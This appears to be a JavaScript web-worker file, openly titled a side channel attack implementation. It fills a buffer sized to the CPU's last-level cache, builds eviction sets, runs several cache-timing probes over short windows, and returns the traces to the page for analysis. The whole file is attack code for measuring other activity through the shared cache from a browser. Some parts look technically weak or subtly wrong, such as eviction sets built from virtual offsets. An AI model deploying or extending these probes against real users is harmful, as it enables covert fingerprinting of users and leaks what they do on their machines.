/* Advanced Side Channel Attack Implementation */
const LINESIZE = 64;
const LLCSIZE = 16 * 1024 * 1024; // 16MB L3 cache
const TIME = 10000; // 10 seconds total collection

// Multi-resolution timing parameters
const TIMING_RESOLUTIONS = [5, 10, 20, 50]; // Different time windows in ms
const CACHE_WAYS = 16; // Typical L3 cache associativity

class AdvancedSideChannel {
    constructor() {
        this.buffer = new Uint8Array(LLCSIZE);
        this.evictionSets = [];
        this.initializeBuffer();
        this.createEvictionSets();
    }
    
    initializeBuffer() {
        // Initialize with pseudo-random pattern to avoid prefetcher prediction
        for (let i = 0; i < LLCSIZE; i += LINESIZE) {
            // Use a non-linear access pattern
            const offset = (i * 7919) % LLCSIZE; // Prime number for better distribution
            this.buffer[offset] = (i / LINESIZE) & 0xFF;
        }
    }
    
    createEvictionSets() {
        // Create eviction sets for more precise cache control
        const setSize = LLCSIZE / (CACHE_WAYS * LINESIZE);
        for (let set = 0; set < 64; set++) { // Monitor 64 different cache sets
            const evictionSet = [];
            for (let way = 0; way < CACHE_WAYS + 2; way++) { // +2 for overflow
                const addr = (set * LINESIZE) + (way * setSize * LINESIZE);
                if (addr < LLCSIZE) {
                    evictionSet.push(addr);
                }
            }
            this.evictionSets.push(evictionSet);
        }
    }
    
    // Advanced technique 1: Multi-resolution sweep
    multiResolutionSweep(timeWindow) {
        const startTime = performance.now();
        let sweepCount = 0;
        let accessPattern = [];
        
        while ((performance.now() - startTime) < timeWindow) {
            const iterStart = performance.now();
            
            // Non-linear access pattern to evade prefetchers
            let sum = 0;
            for (let i = 0; i < LLCSIZE; i += LINESIZE * 3) { // Skip every 3rd line
                const addr = (i * 1009) % LLCSIZE; // Prime-based addressing
                sum += this.buffer[addr];
            }
            
            const iterTime = performance.now() - iterStart;
            accessPattern.push(iterTime);
            sweepCount++;
            
            // Prevent optimization
            if (sum < 0) console.log("impossible");
        }
        
        return {
            count: sweepCount,
            avgTime: accessPattern.reduce((a, b) => a + b, 0) / accessPattern.length,
            variance: this.calculateVariance(accessPattern),
            pattern: accessPattern.slice(-10) // Last 10 measurements
        };
    }
    
    // Advanced technique 2: Cache set monitoring
    cacheSetMonitoring(timeWindow) {
        const results = [];
        const startTime = performance.now();
        
        while ((performance.now() - startTime) < timeWindow) {
            const setResults = [];
            
            // Monitor specific cache sets
            for (let setIdx = 0; setIdx < Math.min(16, this.evictionSets.length); setIdx++) {
                const evictionSet = this.evictionSets[setIdx];
                const setStart = performance.now();
                
                // Access eviction set
                let sum = 0;
                for (const addr of evictionSet) {
                    sum += this.buffer[addr];
                }
                
                const setTime = performance.now() - setStart;
                setResults.push(setTime);
                
                if (sum < 0) console.log("impossible");
            }
            
            results.push(setResults);
        }
        
        return results;
    }
    
    // Advanced technique 3: Timing variance analysis
    timingVarianceAnalysis(timeWindow) {
        const measurements = [];
        const startTime = performance.now();
        
        while ((performance.now() - startTime) < timeWindow) {
            const measureStart = performance.now();
            
            // Measure cache line access time with high precision
            let sum = 0;
            for (let i = 0; i < 1000; i += 1) { // Dense sampling
                const addr = (i * LINESIZE) % LLCSIZE;
                sum += this.buffer[addr];
            }
            
            const measureTime = performance.now() - measureStart;
            measurements.push(measureTime);
            
            if (sum < 0) console.log("impossible");
        }
        
        return {
            measurements: measurements,
            mean: measurements.reduce((a, b) => a + b, 0) / measurements.length,
            variance: this.calculateVariance(measurements),
            entropy: this.calculateEntropy(measurements)
        };
    }
    
    // Advanced technique 4: Frequency domain analysis
    frequencyDomainAnalysis(timeWindow) {
        const samples = [];
        const startTime = performance.now();
        const sampleInterval = 1; // 1ms sampling
        
        while ((performance.now() - startTime) < timeWindow) {
            const sampleStart = performance.now();
            
            // Quick cache probe
            let sum = 0;
            for (let i = 0; i < LLCSIZE; i += LINESIZE * 16) { // Sparse sampling
                sum += this.buffer[i];
            }
            
            samples.push(sum % 256); // Normalize to 0-255
            
            // Wait for next sample
            while ((performance.now() - sampleStart) < sampleInterval) {
                // Busy wait for precise timing
            }
            
            if (sum < 0) console.log("impossible");
        }
        
        return this.simpleFFT(samples);
    }
    
    // Utility functions
    calculateVariance(data) {
        const mean = data.reduce((a, b) => a + b, 0) / data.length;
        const variance = data.reduce((sum, val) => sum + Math.pow(val - mean, 2), 0) / data.length;
        return variance;
    }
    
    calculateEntropy(data) {
        const freq = {};
        data.forEach(val => {
            const bucket = Math.floor(val * 10); // Discretize
            freq[bucket] = (freq[bucket] || 0) + 1;
        });
        
        const total = data.length;
        let entropy = 0;
        for (const count of Object.values(freq)) {
            const p = count / total;
            entropy -= p * Math.log2(p);
        }
        return entropy;
    }
    
    simpleFFT(samples) {
        // Simple frequency analysis (not full FFT)
        const freqBins = [];
        const N = Math.min(samples.length, 64); // Limit for performance
        
        for (let k = 0; k < N / 2; k++) {
            let real = 0, imag = 0;
            for (let n = 0; n < N; n++) {
                const angle = -2 * Math.PI * k * n / N;
                real += samples[n] * Math.cos(angle);
                imag += samples[n] * Math.sin(angle);
            }
            freqBins.push(Math.sqrt(real * real + imag * imag));
        }
        
        return freqBins;
    }
}

// Main advanced sweep function
function advancedSweep(technique = 'multi') {
    const sideChannel = new AdvancedSideChannel();
    const K = Math.floor(TIME / 50); // 50ms windows for advanced techniques
    const results = [];
    
    for (let k = 0; k < K; k++) {
        let result;
        
        switch (technique) {
            case 'multi':
                // Multi-resolution analysis
                const multiRes = {};
                for (const resolution of TIMING_RESOLUTIONS) {
                    multiRes[`res_${resolution}`] = sideChannel.multiResolutionSweep(resolution);
                }
                result = multiRes;
                break;
                
            case 'cache_sets':
                result = sideChannel.cacheSetMonitoring(50);
                break;
                
            case 'variance':
                result = sideChannel.timingVarianceAnalysis(50);
                break;
                
            case 'frequency':
                result = sideChannel.frequencyDomainAnalysis(50);
                break;
                
            default:
                // Combined approach
                result = {
                    multi: sideChannel.multiResolutionSweep(20),
                    variance: sideChannel.timingVarianceAnalysis(15),
                    frequency: sideChannel.frequencyDomainAnalysis(15)
                };
        }
        
        results.push(result);
    }
    
    return results;
}

// Worker message handler
self.addEventListener('message', function(e) {
    if (e.data.command === 'advanced_sweep') {
        try {
            const technique = e.data.technique || 'combined';
            const traceData = advancedSweep(technique);
            
            self.postMessage({
                success: true,
                data: traceData,
                technique: technique,
                timestamp: Date.now(),
                metadata: {
                    resolutions: TIMING_RESOLUTIONS,
                    cache_ways: CACHE_WAYS,
                    llc_size: LLCSIZE
                }
            });
        } catch (error) {
            self.postMessage({
                success: false,
                error: error.message
            });
        }
    }
}); 